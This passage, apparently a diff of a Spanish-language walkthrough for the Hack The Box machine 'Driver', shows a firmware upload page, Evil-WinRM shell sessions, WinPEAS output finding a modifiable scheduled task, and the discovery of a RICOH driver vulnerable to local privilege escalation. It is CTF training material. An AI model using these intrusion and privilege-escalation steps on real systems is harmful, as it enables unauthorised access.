+          &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;move_uploaded_file&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_FILES&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;firmware&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;][&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;tmp_name&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;, &lt;span class=&#34;nv&#34;&gt;$target_file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+            header&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Location: fw_up.php?msg=SUCCESS&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+          &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+          &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+            header&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;Location: fw_up.php?msg=ERR&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+          &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+      &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
+      &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
+        &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;?&amp;gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+
+&amp;lt;br/&amp;gt;&amp;lt;p&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;nbsp&lt;span class=&#34;p&#34;&gt;;&amp;amp;&lt;/span&gt;nbsp&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; Select printer model and upload the respective firmware update to our file share. Our testing team will review the uploads manually and initiates the testing soon.
+  &amp;lt;br/&amp;gt;&amp;lt;form &lt;span class=&#34;nv&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;method&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;post&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;enctype&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;multipart/form-data&amp;#34;&lt;/span&gt;&amp;gt;
+&amp;lt;br/&amp;gt;&amp;lt;center&amp;gt; &amp;lt;table&amp;gt;
+  &amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Printer Model:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;&lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;printers&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;printers&amp;#34;&lt;/span&gt;&amp;gt;
+  &amp;lt;option &lt;span class=&#34;nv&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTB DesignJet&amp;#34;&lt;/span&gt;&amp;gt;HTB DesignJet&amp;lt;/option&amp;gt;
+  &amp;lt;option &lt;span class=&#34;nv&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTB Ecotank&amp;#34;&lt;/span&gt;&amp;gt;HTB Ecotank&amp;lt;/option&amp;gt;
+  &amp;lt;option &lt;span class=&#34;nv&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTB Laserjet Pro&amp;#34;&lt;/span&gt;&amp;gt;HTB Laserjet Pro&amp;lt;/option&amp;gt;
+  &amp;lt;option &lt;span class=&#34;nv&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTB Mono&amp;#34;&lt;/span&gt;&amp;gt;HTB Mono&amp;lt;/option&amp;gt;
+&amp;lt;/select&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
+&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;Upload Firmware:&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;firmware&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;name&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;firmware&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;/td&amp;gt;
+  &amp;lt;/tr&amp;gt;
+  &amp;lt;tr&amp;gt;
+    &amp;lt;td &lt;span class=&#34;nv&#34;&gt;colspan&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;2&amp;#34;&lt;/span&gt;&amp;gt;&amp;lt;input &lt;span class=&#34;nv&#34;&gt;type&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Submit&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;value&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Submit&amp;#34;&lt;/span&gt;/&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;
+&amp;lt;/table&amp;gt;&amp;lt;/center&amp;gt;&amp;lt;/form&amp;gt;
+
+&amp;lt;/body&amp;gt;
+&amp;lt;div &lt;span class=&#34;nv&#34;&gt;class&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;footer&amp;#34;&lt;/span&gt;&amp;gt;
+  &amp;lt;p&amp;gt;&lt;span class=&#34;p&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;#169; 2021 Driver Inc&amp;lt;/p&amp;gt;&lt;/span&gt;
+  &amp;lt;p&amp;gt;&amp;lt;a &lt;span class=&#34;nv&#34;&gt;href&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;mailto:support@driver.htb&amp;#34;&lt;/span&gt;&amp;gt;support@driver.htb&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;
+&amp;lt;/div&amp;gt;
+&amp;lt;/html&amp;gt;
+ &amp;lt;?php &lt;span class=&#34;o&#34;&gt;}}&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;else&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
+        //Send headers to cause a browser to request
+        //username and password from user
+        header&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;WWW-Authenticate: &amp;#34;&lt;/span&gt; .
+            &lt;span class=&#34;s2&#34;&gt;&amp;#34;Basic realm=\&amp;#34;MFP Firmware Update Center\&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+        header&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;HTTP/1.0 401 Unauthorized&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+
+        //Show failure text, which browsers usually
+        //show only after several failed attempts
+        print&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Invalid Credentials&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+    &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt; ?&amp;gt;
+*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\i&lt;/span&gt;netpub&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;wwroot&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Dicho directorio no contiene nada, quizas algun cronjob elimina cada cierto tiempo los archivos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\i&lt;/span&gt;netpub&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;wwroot&amp;gt; dir -Force C:&lt;span class=&#34;se&#34;&gt;\f&lt;/span&gt;irmwares&lt;span class=&#34;se&#34;&gt;\
+&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;&lt;/span&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\i&lt;/span&gt;netpub&lt;span class=&#34;se&#34;&gt;\w&lt;/span&gt;wwroot&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
+&lt;p&gt;Ejecutamos &lt;a href=&#34;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&#34;&gt;WinPEAS&lt;/a&gt;, donde vemos una tarea programada al cual Tony tiene acceso.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ÉÍÍÍÍÍÍÍÍÍÍ¹ Scheduled Applications --Non Microsoft--
+È Check &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; you can modify other users scheduled binaries https://book.hacktricks.xyz/windows/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries
+    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DRIVER&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; VerifyFirmware: C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;ppdata&lt;span class=&#34;se&#34;&gt;\l&lt;/span&gt;ocal&lt;span class=&#34;se&#34;&gt;\j&lt;/span&gt;ob&lt;span class=&#34;se&#34;&gt;\j&lt;/span&gt;ob.bat
+    Permissions file: tony &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;AllAccess&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+    Permissions folder&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;DLL Hijacking&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;: tony &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;AllAccess&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
+    Trigger: At log on of DRIVER&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Vemos que el script accede a la carpeta donde se encuentran los archivos subidos en el sitio web utilizando el Explorer.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tony&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cat &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tony&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;appdata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;job&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;job&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;bat&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;@echo&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;off&lt;/span&gt;
+
+&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOOP&lt;/span&gt;
+
+&lt;span class=&#34;k&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;SystemRoot&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;%\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;explorer&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;exe&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\firmwares&amp;#34;&lt;/span&gt;
+
+&lt;span class=&#34;n&#34;&gt;ping&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-n&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;127&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;nul&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;powershell&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ep&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;bypass&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;c:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tony&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;appdata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;job&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;quit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ps1&lt;/span&gt;
+
+&lt;span class=&#34;nb&#34;&gt;DEL &lt;/span&gt;&lt;span class=&#34;p&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;q&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;firmwares&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\*&lt;/span&gt;
+
+&lt;span class=&#34;nb&#34;&gt;cls
+&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;&lt;/span&gt;
+&lt;span class=&#34;n&#34;&gt;GOTO&lt;/span&gt; &lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LOOP&lt;/span&gt;
+
+&lt;span class=&#34;err&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;EXIT&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tony&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cat &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;c:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tony&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;appdata&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;local&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;job&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;quit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ps1&lt;/span&gt;
+&lt;span class=&#34;nv&#34;&gt;$folder&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;no&#34;&gt;[uri]&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;C:\firmwares&amp;#39;&lt;/span&gt;
+&lt;span class=&#34;k&#34;&gt;foreach&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$w&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;New-Object&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ComObject&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Shell&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Application&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;).&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Windows&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()){&lt;/span&gt; 
+  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$w&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;LocationUrl&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-ieq&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$folder&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;AbsoluteUri&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+    &lt;span class=&#34;nv&#34;&gt;$w&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Quit&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt; 
+    &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;
+  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Evil-WinRM&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;PS &lt;/span&gt;&lt;span class=&#34;n&#34;&gt;C:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Users&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;tony&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;Documents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Finalmente vemos en el historial de la consola una impresora que fue agregada utilizando powershell, dicha version de impresora puede ser explotada para &lt;a href=&#34;https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/&#34;&gt;Escalar Privilegios&lt;/a&gt;, sin embargo por alguna razon la &lt;a href=&#34;https://www.pentagrid.ch/en/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/#proof-of-concept-exploit&#34;&gt;explotación&lt;/a&gt; no tuvo exito, aún asi intentado con el &lt;a href=&#34;https://www.rapid7.com/blog/post/2020/02/14/metasploit-wrap-up-51/#ricohprivilegeescalation&#34;&gt;Modulo de Metasploit&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;*Evil-WinRM* PS C:&lt;span class=&#34;se&#34;&gt;\U&lt;/span&gt;sers&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;ony&lt;span class=&#34;se&#34;&gt;\D&lt;/span&gt;ocuments&amp;gt; cat &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Users\tony\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt&amp;#34;&lt;/span&gt;
+Add-Printer -PrinterName &lt;span class=&#34;s2&#34;&gt;&amp;#34;RICOH_PCL6&amp;#34;&lt;/span&gt; -DriverName &lt;span class=&#34;s1&#34;&gt;&amp;#39;RICOH PCL6 UniversalDriver V4.23&amp;#39;&lt;/span&gt; -PortName &lt;span class=&#34;s1&#34;&gt;&amp;#39;lpt1:&amp;#39;&lt;/span&gt;
+
+ping 1.1.1.1
+ping 1.1.1.1
